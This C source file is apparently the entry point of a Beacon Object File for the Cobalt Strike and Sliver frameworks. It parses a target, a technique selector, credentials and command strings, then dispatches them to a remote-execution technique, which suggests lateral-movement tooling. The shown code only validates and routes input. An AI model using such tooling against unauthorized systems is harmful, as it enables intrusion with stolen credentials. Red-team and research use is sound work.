#include "rex.h"
#include "beacon.h"

static void rex_fail(rex_result *output, rex_phase phase, HRESULT error) {
    output->status = REX_STATUS_FAILED;
    output->phase = phase;
    output->error = error;
    rex_result_write(output);
}

static BOOL rex_valid_wide(const wchar_t *value, int value_size,
                           SIZE_T maximum) {
    SIZE_T length;
    if (value == NULL || value_size < (int)sizeof(wchar_t) ||
        value_size % (int)sizeof(wchar_t) != 0 ||
        value[(value_size / (int)sizeof(wchar_t)) - 1] != L'\0') {
        return FALSE;
    }
    length = rex_wcslen(value);
    return length <= maximum &&
           value_size == (int)((length + 1) * sizeof(wchar_t));
}

static void rex_run(const char *action, int action_size, const char *target,
                    int target_size, const char *selector, int selector_size,
                    const wchar_t *principal, int principal_size,
                    wchar_t *password, int password_size, wchar_t *values[3],
                    const int value_sizes[3], int remaining) {
    int value_index;
    rex_arguments arguments = {0};
    rex_result output = {0};
    rex_technique descriptor = {0};
    const rex_technique *technique = &descriptor;

    output.technique = "";
    output.target = "";
    if (action == NULL || target == NULL || selector == NULL ||
        action_size < 2 || target_size < 2 || selector_size < 2 ||
        action[action_size - 1] != '\0' || target[target_size - 1] != '\0' ||
        selector[selector_size - 1] != '\0' ||
        action_size != (int)(rex_strlen(action) + 1) ||
        target_size != (int)(rex_strlen(target) + 1) ||
        selector_size != (int)(rex_strlen(selector) + 1) || remaining != 0 ||
        (!rex_streq(action, "execute") && !rex_streq(action, "preflight")) ||
        !rex_valid_target(target) || !rex_valid_selector(selector) ||
        !rex_valid_wide(principal, principal_size, REX_MAX_PRINCIPAL) ||
        !rex_valid_wide(password, password_size, REX_MAX_PASSWORD)) {
        if (password != NULL && password_size > 0)
            rex_zero(password, (SIZE_T)password_size);
        rex_fail(&output, REX_PHASE_INPUT, E_INVALIDARG);
        return;
    }
    for (value_index = 0; value_index < 3; value_index++) {
        if (!rex_valid_wide(values[value_index], value_sizes[value_index],
                            REX_MAX_COMMAND)) {
            rex_zero(password, (SIZE_T)password_size);
            rex_fail(&output, REX_PHASE_INPUT, E_INVALIDARG);
            return;
        }
    }

    output.target = target;
    if (!rex_find_technique(selector, &descriptor)) {
        rex_zero(password, (SIZE_T)password_size);
        rex_fail(&output, REX_PHASE_INPUT, E_INVALIDARG);
        return;
    }
    output.technique = technique->selector;

    arguments.action = rex_streq(action, "preflight") ? REX_ACTION_PREFLIGHT
                                                      : REX_ACTION_EXECUTE;
    arguments.target = target;
    arguments.selector = selector;
    arguments.identity.principal = principal;
    arguments.identity.password = password;
    for (value_index = 0; value_index < 3; value_index++) {
        arguments.values[value_index] = values[value_index];
    }
    rex_invoke(technique, &arguments, &output);
    rex_result_write(&output);
}

void go(char *args, int argument_length) {
    datap parser;
    int action_size = 0;
    int target_size = 0;
    int selector_size = 0;
    int principal_size = 0;
    int password_size = 0;
    int value_sizes[3] = {0};
    int value_index;
    char *action;
    char *target;
    char *selector;
    wchar_t *principal;
    wchar_t *password;
    wchar_t *values[3];

    BeaconDataParse(&parser, args, argument_length);
    action = BeaconDataExtract(&parser, &action_size);
    target = BeaconDataExtract(&parser, &target_size);
    selector = BeaconDataExtract(&parser, &selector_size);
    principal = (wchar_t *)BeaconDataExtract(&parser, &principal_size);
    password = (wchar_t *)BeaconDataExtract(&parser, &password_size);
    for (value_index = 0; value_index < 3; value_index++) {
        values[value_index] =
            (wchar_t *)BeaconDataExtract(&parser, &value_sizes[value_index]);
    }
    rex_run(action, action_size, target, target_size, selector, selector_size,
            principal, principal_size, password, password_size, values,
            value_sizes, BeaconDataLength(&parser));
}

static void rex_go_sliver(char *args, int argument_length, int value_count) {
    datap parser;
    int action_size = 0;
    int target_size = 0;
    int principal_size = 0;
    int password_size = 0;
    int value_sizes[3] = {(int)sizeof(wchar_t), (int)sizeof(wchar_t),
                          (int)sizeof(wchar_t)};
    int value_index;
    rex_technique technique = {0};
    const char *selector;
    char *action;
    char *target;
    wchar_t *principal;
    wchar_t *password;
    wchar_t empty = L'\0';
    wchar_t *values[3] = {&empty, &empty, &empty};

    rex_load_technique(&technique);
    selector = technique.selector;

    BeaconDataParse(&parser, args, argument_length);
    action = BeaconDataExtract(&parser, &action_size);
    target = BeaconDataExtract(&parser, &target_size);
    principal = (wchar_t *)BeaconDataExtract(&parser, &principal_size);
    password = (wchar_t *)BeaconDataExtract(&parser, &password_size);
    for (value_index = 0; value_index < value_count; value_index++) {
        values[value_index] =
            (wchar_t *)BeaconDataExtract(&parser, &value_sizes[value_index]);
    }
    rex_run(action, action_size, target, target_size, selector,
            (int)(rex_strlen(selector) + 1), principal, principal_size,
            password, password_size, values, value_sizes,
            BeaconDataLength(&parser));
}

#if defined(__GNUC__)
#define REX_SLIVER_SYMBOL(name) __asm__(name)
#else
#define REX_SLIVER_SYMBOL(name)
#endif

void go_sliver_1(char *args, int argument_length)
    REX_SLIVER_SYMBOL("go_sliver_1");
void go_sliver_2(char *args, int argument_length)
    REX_SLIVER_SYMBOL("go_sliver_2");
void go_sliver_3(char *args, int argument_length)
    REX_SLIVER_SYMBOL("go_sliver_3");

void go_sliver_1(char *args, int argument_length) {
    rex_go_sliver(args, argument_length, 1);
}

void go_sliver_2(char *args, int argument_length) {
    rex_go_sliver(args, argument_length, 2);
}

void go_sliver_3(char *args, int argument_length) {
    rex_go_sliver(args, argument_length, 3);
}

#undef REX_SLIVER_SYMBOL
